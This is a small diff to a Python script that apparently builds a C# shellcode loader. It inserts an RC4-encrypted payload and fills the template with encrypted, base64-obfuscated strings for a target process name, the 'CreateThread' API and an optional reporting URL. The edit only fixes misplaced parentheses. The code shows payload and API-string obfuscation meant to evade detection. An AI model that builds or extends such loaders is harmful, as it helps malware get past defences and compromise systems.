@@ -173,13 +173,13 @@ if __name__ == "__main__":
     template = gen.set_template(template_path).get_output()
     template = template.replace("[KEY]", gen.format_rc4_key(key)) \
     .replace("[PAYLOAD]", cipher) \
-    .replace("[PROCESS_NAME]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("process_name"), key))), pattern1, "A", pattern2, "B") \
-    .replace("[CREATE_THREAD]", Helper.replace_data(base64.b64encode(rc4.Encrypt("CreateThread", key))), pattern1, "A", pattern2, "B") \
+    .replace("[PROCESS_NAME]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("process_name"), key)), pattern1, "A", pattern2, "B")) \
+    .replace("[CREATE_THREAD]", Helper.replace_data(base64.b64encode(rc4.Encrypt("CreateThread", key)), pattern1, "A", pattern2, "B")) \
     .replace("[PATTERN_1]", pattern1) \
     .replace("[PATTERN_2]", pattern2)
     
     if args.report:
-        template = template.replace("[URL_REPORT]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("url_report"), key))), pattern1, "A", pattern2, "B")
+        template = template.replace("[URL_REPORT]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("url_report"), key)), pattern1, "A", pattern2, "B"))
 	
     Helper.save_file("%s/Program.cs" % out_dir, template)
     
